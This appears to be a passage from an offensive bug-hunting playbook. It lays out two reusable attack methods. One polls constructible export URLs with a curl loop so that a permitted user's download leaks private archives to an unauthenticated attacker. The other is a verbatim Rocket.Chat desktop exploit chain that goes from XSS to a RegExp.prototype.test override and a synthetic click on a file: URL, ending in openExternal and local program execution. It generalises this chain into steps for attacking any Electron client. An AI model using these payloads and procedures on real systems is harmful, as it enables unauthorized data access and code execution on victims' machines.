TRANSFERABLE TEST: on every constructible export/archive/raw URL behind authz: (1) unauth `curl -i` the URL -> expect deny; (2) have a PERMITTED account request it once (two-account lab or an in-scope member flow); (3) immediately re-issue the unauth GET from a clean client — a 200 with the bytes = the window; (4) if manual timing is flaky, run a headless loop (`while :; do curl -s -o out.zip -w '%{http_code}\n' <url>; done` / the report's Selenium `times` script) so any future authorized use of the link pays out. Rule: **if an authorized request changes what an unauthorized request to the same URL receives, the authorization decision is being shared/cached without the auth context in the key — poll constructible export URLs and let legitimate usage win the race for you.**
DEDUPE/DELTA: tokens `1043480`, `anshraj_srivastava`, `/-/archive/`, `my-private-proj`, `warms` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: playbook §11.6 "Parallel-request 403 bypass ... (race in the authorization cache)" (Facebook — CONCURRENT identical requests race the authz DECISION itself; here the decision is correct and a permitted request's SHARED cached response is what leaks — different mechanism, same symptom family); §8.8 / §12.4 cache deception (the VICTIM loads an attacker-crafted URL and the victim's own token-bearing response is cached for the attacker to collect; here the victim loads the LEGITIMATE URL and the attacker collects the CONTENT that authz should have hidden — no victim token involved); ledger ~4244 (Active Storage `Cache-Control: public` + session `Set-Cookie` cached — a cookie leak; here it is the DATA); ledger ~2663 (async export TOCTOU — no re-authz at job execution; here the export is synchronous and the leak is the shared window). NEW: the authorized-request cache window on constructible export URLs + the polling attacker. New general method -> §17.746.

CLASS: RCE — webview XSS -> prototype-patched allowlist -> `electron.shell.openExternal` with a `file:` URL -> local program execution (the report's own weakness tag: OS Command Injection)
CORE METHOD:
  1. THE PRIMITIVE (report verbatim): "It is possible to call `electron.shell.openExternal` from javascript inside a server webview." and "The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`." — the document click handler routes link-opens through openExternal, gating the href with a regex check.
  2. THE BYPASS (report verbatim payload): `var old_test = RegExp.prototype.test; RegExp.prototype.test = function (s) { if (s === payload) { return (++counter > 3); } return old_test.call(this, s); };` — the gate's `Regex.test` is monkey-patched with a counting override that flips to `true` for the exact payload URL after a few consultations while leaving every other regex check intact.
  3. THE TRIGGER (report verbatim): `var target = document.createElement('a'); target.setAttribute('href', payload); document.body.appendChild(target); ... target.dispatchEvent(new Event('click'));` with `const payload = \`file:///System/Applications/Calculator.app\`;` — a synthetic click on an attacker-created `<a>` delivers the `file:` URL to openExternal ("for macos, adjust for other OSes as required").
  4. THE DELIVERY + IMPACT (report verbatim): "1. Have a XSS vulnerability such as #894462 or #899954. 2. Call the following payload ... 3. Browse to a page with the XSS payload. 4. Use your freshly opened calculator to calculate the result of 7*191." — impact: "An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution."
DETECTION SIGNAL: an Electron/CEF chat client where a server's webview JS can reach `electron.shell.openExternal`; a document-level `onclick`/link handler that opens links only after a regex/allowlist `test` on the href; any allowlist predicate consulted from JS-reachable code (a monkey-patchable `RegExp.prototype.test` / `String.prototype.*` is not a security boundary). Tell: patching `RegExp.prototype.test` changes the gate's verdict.
CHAIN: XSS in any connected server's webview (precondition per report: "Have a XSS vulnerability such as #894462 or #899954" — the sibling Rocket.Chat injection family) -> override `RegExp.prototype.test` with a counting allowlist-pass (primitive: prototype gadget turns the regex gate into a no-op for one chosen URL) -> synthetic `click` on `<a href="file:///System/Applications/Calculator.app">` (escalation: the app's own click handler performs the privileged open) -> `electron.shell.openExternal` with an arbitrary URL incl. `file:` (terminal per report: "arbitrary command execution" — the macOS Calculator launching is the proof; a `file:`/custom-scheme URL reaches local program execution = RCE on the client machine).
TRANSFERABLE TEST: on every Electron/CEF desktop client: (1) from any in-app webview/XSS context check reachability of the host's `openExternal` (Electron `shell`/`require` bridges, `window.electron`, preload-exposed APIs); (2) find the link-open gate (document `onclick` handler / `new-window` handler) and identify its allowlist predicate; (3) if the predicate is a prototype method (`RegExp.prototype.test`, `String.prototype.startsWith`, ...) override it (`RegExp.prototype.test = () => true`, or a counting override for the exact target string), create `<a href="file:///System/Applications/Calculator.app">` (macOS) / `file:///c:/windows/system32/calc.exe` (Windows) and `target.dispatchEvent(new Event('click'))`; (4) a launched local program = RCE.
